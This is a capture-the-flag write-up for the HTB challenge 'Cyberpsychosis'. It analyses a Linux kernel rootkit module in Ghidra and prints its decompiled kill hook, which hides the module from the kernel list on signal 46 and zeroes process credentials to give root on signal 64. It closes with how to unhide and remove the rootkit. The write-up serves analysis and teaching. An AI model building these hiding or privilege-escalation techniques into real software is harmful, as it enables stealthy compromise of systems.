# HTB Cyberpsychosis


## Description
Malicious actors have infiltrated our systems and we believe they've implanted a custom rootkit. Can you disarm the rootkit and find the hidden data?

## Solution
We get a file called 'diamorphic.ko' which is a Linux kernel module. Loading it in Ghidra and analyzing it we can soon figure it's a rootkit.  
It hides itself from calls to `getdents` and `getdents64`, and changes the `kill` behavior. We cannot kill the process since we cannot find it on the `/proc` filesystem.  
The `hacked_kill` function has a unique behavior depending on the signal sent. Let's analyze the decompiled code:  

```c
int hacked_kill(pt_regs *pt_regs)
{
  undefined1 *puVar1;
  list_head *plVar2;
  int iVar3;
  long lVar4;
  undefined *puVar5;
  
  plVar2 = module_previous;
  iVar3 = (int)pt_regs->si;
  if (iVar3 == 46) {
    if (module_hidden != 0) {
      __this_module.list.next = module_previous->next;
      (__this_module.list.next)->prev = &__this_module.list;
      __this_module.list.prev = plVar2;
      module_hidden = 0;
      plVar2->next = (list_head *)0x1010c8;
      return 0;
    }
    iVar3 = 0;
    (__this_module.list.next)->prev = __this_module.list.prev;
    module_previous = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    module_hidden = 1;
  }
  else if (iVar3 == 64) {
    lVar4 = prepare_creds();
    iVar3 = 0;
    if (lVar4 != 0) {
      *(undefined8 *)(lVar4 + 4) = 0;
      *(undefined8 *)(lVar4 + 0xc) = 0;
      *(undefined8 *)(lVar4 + 0x14) = 0;
      *(undefined8 *)(lVar4 + 0x1c) = 0;
      commit_creds(lVar4);
      return iVar3;
    }
  }
  else {
    puVar5 = &init_task;
    if (iVar3 == 0x1f) {
      do {
        puVar1 = *(undefined1 **)(puVar5 + 0x8b8);
        puVar5 = puVar1 + -0x8b8;
        if (puVar1 == &DAT_001028f0) {
          return -3;
        }
      } while ((int)pt_regs->di != *(int *)(puVar1 + 0x108));
      if (puVar5 == (undefined *)0x0) {
        return -3;
      }
      *(uint *)(puVar1 + -0x88c) = *(uint *)(puVar1 + -0x88c) ^ 0x10000000;
      return 0;
    }
    lVar4 = (*orig_kill)(pt_regs);
    iVar3 = (int)lVar4;
  }
  return iVar3;
}
```

Let's analyze the first part:
```c
if (iVar3 == 46) {
    if (module_hidden != 0) {
      __this_module.list.next = module_previous->next;
      (__this_module.list.next)->prev = &__this_module.list;
      __this_module.list.prev = plVar2;
      module_hidden = 0;
      plVar2->next = (list_head *)0x1010c8;
      return 0;
    }
    iVar3 = 0;
    (__this_module.list.next)->prev = __this_module.list.prev;
    module_previous = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    module_hidden = 1;
  }
```

In Linux, each loaded kernel module is stored in a doubly linked list. If the module is hidden, we are adding it back to the list, and if it's not hidden, we are removing it from the list. So sending signal 46 to the process will toggle the visibility of the rootkit.  

Now for the second case:
```c
  else if (iVar3 == 64) {
    lVar4 = prepare_creds();
    iVar3 = 0;
    if (lVar4 != 0) {
      *(undefined8 *)(lVar4 + 4) = 0;
      *(undefined8 *)(lVar4 + 0xc) = 0;
      *(undefined8 *)(lVar4 + 0x14) = 0;
      *(undefined8 *)(lVar4 + 0x1c) = 0;
      commit_creds(lVar4);
      return iVar3;
    }
  }
```

The `prepare_creds` function creates a new credentials structure for the current process, and the `commit_creds` function replaces the current process's credentials with the new one. By setting all the fields to 0, we are effectively giving ourselves root privileges. So sending signal 64 to the process will give us root access.  


We can also run the command with the 46 signal to make the process visible and see it in the process list, and then run `rmmod diamorphine` to remove the rootkit from the kernel.

Here is the full flow:
![flag](posts/images/cyberpsychosis/flag.png)
